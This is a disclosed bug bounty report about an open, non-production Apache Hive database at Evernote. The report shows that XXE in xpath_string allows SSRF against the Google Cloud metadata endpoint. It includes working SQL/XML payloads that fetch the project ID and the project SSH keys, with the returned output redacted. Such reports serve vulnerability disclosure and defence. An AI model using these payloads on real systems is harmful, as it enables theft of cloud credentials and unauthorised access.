# Non-production Open Database In Combination With XXE Leads To SSRF

## Report Details
- **Report ID**: 742808
- **URL**: https://hackerone.com/reports/742808
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-11-21T00:27:31.178Z
- **Disclosed**: 2020-10-27T15:20:40.726Z

## Reporter
- **Username**: kaulse
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: evernote

## Vulnerability Information
## Summary:
The Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.
By "open", I mean that the database can be accessed by anyone.

## Steps To Reproduce:
Chose any database client that supports Apache Hive and also uses a specific client version. "Specific client version" because you will otherwise get an error which looks like this:
```
13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session
org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})
```
  1. Chose a database client and connect to mentioned IP and port
  2. Execute the following SQL payload:

```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
The query above will return the associated project id which is "en-development".

## Supporting Material/References:
I will list some interesting information that I queried below.

**Query**
```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
**Response**
```
████
█████
██████████
█████████
██████
██████████
██████
████████
████
████
████████
███████
█████████
███████
██████
█████
███
███
████
████████
██████
█████████
███████
██████████
█████████
████
█████████
████
██████████
█████
██████████
█████
████████
██████████
██████
██████████
█████
█████
██████
██████████
█████
███
████
```

## Impact

Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.

## Attachments
No attachments
